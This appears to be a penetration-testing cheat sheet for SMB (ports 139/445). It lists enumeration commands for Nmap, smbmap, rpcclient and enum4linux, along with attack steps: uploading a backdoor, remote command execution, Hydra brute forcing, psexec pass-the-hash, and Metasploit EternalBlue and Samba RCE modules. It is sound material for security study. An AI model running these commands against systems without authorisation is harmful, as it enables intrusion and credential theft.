---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# 139,445 - SMB

## Nmap Scripts

The example command for enumerating _<mark style="color:green;">Server Message Block</mark>_ (SMB) with Nmap is here.

```bash
# version/dialect
sudo nmap -p445 --script=smb-protocols $IP

# netbios of SMB
sudo nmap -p445 --script=smb-os-discovery $IP

# security mode
sudo nmap -p445 --script=smb-security-mode $IP

# smb shares
sudo nmap -p445 --script=smb-enum-shares $IP

# Check EternalBlue vulnerability
sudo nmap -p445 --script=smb-vuln-ms17-010 $IP

# Enum login user session
sudo nmap -p445 --script=smb-enum-sessions $IP

# Enum login user session with AUTHENTICATION
sudo nmap -p445 --script=smb-enum-sessions --script-args smbusername=administrator,smbpassword=password123 $IP

# Enum user with AUTHENTICATION
sudo nmap -p445 --script=smb-enum-users --script-args smbusername=administrator,smbpassword=password123 $IP

# Enum groups with AUTHENTICATION
sudo nmap -p445 --script=smb-enum-groups --script-args smbusername=administrator,smbpassword=password123 $IP

# Enum SMB shares with AUTHENTICATION
sudo nmap -p445 --script=smb-enum-shares --script-args smbusername=administrator,smbpassword=password123 $IP
```

## Smbmap

is a command line utility made from scripting language (python). Here are some examples of commands for _<mark style="color:green;">enumerate/interact/connect</mark>_ into SMB. It is also _often used for enumerating permissions on shares_.

```bash
# Enum with NULL sessions / checking shares permissions
smbmap -u guest -p "" -d . -H $IP

# Enum with AUTHENTICATION / checking shares permissions
smbmap -u "administrator" -p "password123" -H $IP

# List all shares with AUTHENTICATION
smbmap -u "administrator" -p "password123" -H $IP -L

# List all items in shares with AUTHENTICATION
smbmap -u "administrator" -p "password123" -H $IP -r 'C$'

# Execute command with AUTHENTICATION
smbmap -u "administrator" -p "password123" -H $IP -x 'ipconfig'

# Upload file with AUTHENTICATION
smbmap -u "administrator" -p "password123" -H $IP --upload '/root/backdoor' 'C$\backdoor'

# Download file with AUTHENTICATION
smbmap -u "administrator" -p "password123" -H $IP --download 'C$\flag.txt'
```

## Smbclient

is a command line utility that came with Linux by default. Here are some examples of commands for listing shares.

```bash
# List all shares
smbclient -L $IP -N

# Connect to shares
smbclient //$IP/<share> -N

# List all shares with AUTHENTICATION
smbclient -L \\\\$IP\\ -U administrator

# Connect to shares with AUTHENTICATION
smbclient \\\\$IP\\<share> -U administrator
```

## CrackMapExec

is a powerful tool dubbed as _<mark style="color:green;">swiss army knife</mark>_ for pentesting Windows/Active Directory environments.

```bash
# Get Windows version
crackmapexec smb $IP

# Listing shares/permissions
crackmapexec smb $IP --shares -u "" -p ""

# Enum user for ASREPRoast attack
crackmapexec smb $IP -u /worlists/users.txt -p "" -k
```

## Rpcclient

is a command line tool initially developed to test _<mark style="color:green;">MS-RPC</mark>_ functionality in Samba itself.

```bash
rpcclient -U "" -N $IP                 # null sessions
rpcclient -U admin%passwd123 $IP       # auth sessions
    > srvinfo                   # enum os version
    > enumdomusers              # enum all users
    > lookupnames admin         # enum user 
    > enumdomgroups             # enum groups
    > netshareenumall           # listing all shares
    > netsharegetinfo <share>   # more info about the share    
```

## Enum4Linux

is a command line tool that is installed by default in Kali Linux. It is used for enumerating information from Windows and Samba systems.

```bash
# Enum all things
enum4linux -a $IP

# Enum os information
enum4linux -o $IP

# Enum users
enum4linux -U $IP

# Enum shares 
enum4linux -S $IP

# Enum groups
enum4linux -G $IP

# Cheking the printer presents
enum4linux -i $IP

# Enum all things with AUTHENTICATION
enum4linux -a -u "administrator" -p "password123" $IP

# Enum users SID with AUTHENTICATION
enum4linux -r -u "administrator" -p "password123" $IP
```

## Nmblookup

is designed to make use of queries for the _<mark style="color:green;">NetBIOS</mark>_ names and then map them to their subsequent IP address in a network. All queries are done over _<mark style="color:green;">UDP</mark>_.

```bash
# Initial connection
nmblookup -A $IP

# For unique names: (code number)
00: Workstation Service (workstation name)
03: Windows Messenger service
06: Remote Access Service
20: File Service (also called Host Record)
21: Remote Access Service client
1B: Domain Master Browser – Primary Domain Controller for a domain
1D: Master Browser

# For group names: (code number)
00: Workstation Service (workgroup/domain name)
1C: Domain Controllers for a domain
1E: Browser Service Elections
```

## Hydra

is a brute force tool that is installed in Kali Linux by default. It can brute force the password/user's file list in several protocols.

```bash
hydra -l "admin" -P /wordlists/passwords.txt $IP smb
```

## Impacket-PsExec.py & PsExec.exe

is a lightweight telnet replacement developed by `Microsoft` that _<mark style="color:green;">allows to execute processes</mark>_ on remote Windows systems using any user's credentials. _<mark style="color:green;">Psexec authentication is performed via SMB</mark>_.

```bash
# Login with AUTHENTICATION (prompt password)
impacket-psexec.py Administrator@$IP

# Login with HASH
impacket-psexec.py Administrator@$IP -hashes <hash>
impacket-psexec.py example.local/Administrator@$IP -hashes <hash>
```

## MSFconsole

is a framework that holds many exploits, backdoors, scanners, etc. This is also known as _<mark style="color:green;">Metasploit</mark>_, by default, it is installed on Kali Linux.

```bash
auxiliary/scanner/smb/smb_version
auxiliary/scanner/smb/smb2
auxiliary/scanner/smb/smb_enumusers
auxiliary/scanner/smb/smb_enumshares
auxiliary/scanner/smb/smb_login
auxiliary/scanner/smb/pipe_auditor
exploit/windows/smb/psexec

# Scan the target for vulnerability
auxiliary/scanner/smb/smb_ms17_010

# Exploit the eternalblue
exploit/windows/smb/smb_ms17_010_eternalblue

# Exploiting samba v3.5.0 (RCE)
exploit/linux/samba/is_known_pipename
```
